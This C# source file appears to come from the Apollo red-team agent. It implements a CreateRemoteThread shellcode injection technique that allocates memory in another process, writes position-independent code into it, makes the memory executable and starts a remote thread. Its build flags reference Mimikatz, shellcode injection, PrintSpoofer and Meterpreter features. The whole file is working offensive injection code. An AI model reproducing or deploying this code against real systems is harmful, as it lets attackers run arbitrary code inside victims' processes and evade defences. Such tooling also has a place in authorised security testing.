#define COMMAND_NAME_UPPER

#if DEBUG
#undef MIMIKATZ
#undef RUN
#undef SHELL
#undef POWERPICK
#undef PSINJECT
#undef EXECUTE_ASSEMBLY
#undef ASSEMBLY_INJECT
#undef SHINJECT
#undef LIST_INJECTION_TECHNIQUES
#undef GET_INJECTION_TECHNIQUE
#undef SET_INJECTION_TECHNIQUE
#undef SPAWN
#undef PRINTSPOOFER
#define MIMIKATZ
#define RUN
#define SHELL
#define POWERPICK
#define PSINJECT
#define EXECUTE_ASSEMBLY
#define ASSEMBLY_INJECT
#define SHINJECT
#define LIST_INJECTION_TECHNIQUES
#define GET_INJECTION_TECHNIQUE
#define SET_INJECTION_TECHNIQUE
#define PRINTSPOOFER
#define SPAWN
#endif

#define POWERPICK

#if MIMIKATZ ||SPAWN|| RUN || PRINTSPOOFER || SHELL || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || SHINJECT || LIST_INJECTION_TECHNIQUES || GET_INJECTION_TECHNIQUE || SET_INJECTION_TECHNIQUE || METERPRETER

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using static Native.Structures;
using static Native.Methods;
using static Native.Enums;
using static Native.Constants;
using System.Runtime.InteropServices;
using static Utils.DebugUtils;

namespace Apollo.Injection
{
    public class CreateRemoteThreadInjection : InjectionTechnique
    {
        public CreateRemoteThreadInjection(byte[] pic, uint pid) : base(pic, pid)
        {

        }

        public override bool Inject(string arguments = "")
        {
            bool bRet = true;
            IntPtr hProcess, remoteThread = IntPtr.Zero;
            hProcess = System.Diagnostics.Process.GetProcessById((int)processID).Handle;
            if (hProcess == IntPtr.Zero || hProcess == null)
                bRet = false;
            try
            {
                uint bytesWritten = 0;
                IntPtr allocSpace = VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    (ulong)positionIndependentCode.Length,
                    AllocationType.Commit | AllocationType.Reserve,
                    MemoryProtection.ReadWrite);
                if (allocSpace == IntPtr.Zero)
                {
                    bRet = false;
                }
                else
                {
                    bRet = WriteProcessMemory(hProcess, allocSpace, positionIndependentCode, (uint)positionIndependentCode.Length, out bytesWritten);
                    if (bRet)
                    {
                        //Marshal.Copy(positionIndependentCode, 0, allocSpace, positionIndependentCode.Length);
                        uint flOldProtect = 0;
                        if (!VirtualProtectEx(hProcess, allocSpace, (uint)positionIndependentCode.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
                            bRet = false;
                        else
                        {
                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
                            remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero/*may need to change to string pointer later*/, 0, IntPtr.Zero);
                            if (remoteThread == IntPtr.Zero)
                                bRet = false;
                            else
                                bRet = true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                DebugWriteLine("ERROR! Could not create remote thread.");
                bRet = false;
            }
            finally
            {
                //if (hProcess != IntPtr.Zero)
                //    CloseHandle(hProcess);
                //if (remoteThread != IntPtr.Zero)
                //    CloseHandle(remoteThread);
            }
            return bRet;
        }

        //private IntPtr CreateProcess(
        //    string lpApplicationName,
        //    SECURITY_ATTRIBUTES lpProcessAttributes,
        //    SECURITY_ATTRIBUTES lpThreadAttributes,
        //    STARTUPINFO lpStartupInfo)
        //{
        //    IntPtr hProcess = IntPtr.Zero;
        //    PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
        //    if (!CreateProcessA(
        //        lpApplicationName,
        //        "",
        //        lpProcessAttributes,
        //        lpThreadAttributes,
        //        false,
        //        ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW,
        //        IntPtr.Zero,
        //        "",
        //        lpStartupInfo,
        //        out procInfo))
        //    {
        //        return IntPtr.Zero;
        //    }
        //    return procInfo.hProcess;
        //}
    }
}
#endif